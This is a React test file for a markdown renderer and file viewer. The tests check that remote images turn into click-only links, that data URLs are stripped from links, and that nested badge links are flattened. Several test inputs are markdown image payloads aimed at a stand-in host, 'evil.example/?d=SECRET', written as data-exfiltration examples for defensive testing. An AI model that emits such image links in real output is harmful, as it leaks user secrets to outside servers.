import { cleanup, render, screen } from '@testing-library/react';
import { afterEach, describe, expect, it } from 'vitest';
import { FileViewer } from './FileViewer.js';
import { QuestMarkdown } from './markdown.js';

const PIXEL = 'data:image/png;base64,iVBORw0KGgo=';

describe('images in markdown', () => {
  afterEach(() => cleanup());

  it('never loads a remote image by itself: it is a link the user clicks', () => {
    const { container } = render(<QuestMarkdown>{'![a chart](https://evil.example/?d=SECRET)'}</QuestMarkdown>);
    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByRole('link', { name: /a chart.*evil\.example/ }) as HTMLAnchorElement;
    expect(link.href).toBe('https://evil.example/?d=SECRET');
    expect(link.target).toBe('_blank');
    expect(link.rel).toContain('noreferrer');
  });

  it('treats a protocol-relative address as remote too', () => {
    const { container } = render(<QuestMarkdown>{'![x](//evil.example/a.png)'}</QuestMarkdown>);
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByRole('link', { name: /evil\.example/ })).toBeTruthy();
  });

  it('shows a data image and a same-origin image', () => {
    const { container } = render(<QuestMarkdown>{`![dot](${PIXEL})\n\n![icon](/favicon.svg)`}</QuestMarkdown>);
    const images = [...container.querySelectorAll('img')];
    expect(images.map((image) => image.getAttribute('src'))).toEqual([PIXEL, '/favicon.svg']);
  });

  it('keeps data out of links, where it could run', () => {
    render(<QuestMarkdown>{'[click](data:text/html,hello)'}</QuestMarkdown>);
    expect(screen.getByText('click').getAttribute('href')).toBe('');
  });

  it('leaves a badge inside a link as text, with no link inside a link', () => {
    const { container } = render(
      <QuestMarkdown>{'[![build](https://badge.example/b.svg)](https://ci.example/run)'}</QuestMarkdown>,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelectorAll('a')).toHaveLength(1);
    expect(container.querySelector('a')!.textContent).toMatch(/build/);
  });

  it('holds in a repo file shown in the viewer as well', () => {
    const { container } = render(
      <FileViewer
        file={{
          session: '11111111-1111-4111-8111-111111111111',
          requested: 'README.md',
          reply: {
            kind: 'file',
            requestId: '22222222-2222-4222-8222-222222222222',
            ok: true,
            content: '![x](https://evil.example/?d=SECRET)',
          },
        }}
        onClose={() => {}}
      />,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByRole('link', { name: /evil\.example/ })).toBeTruthy();
  });
});
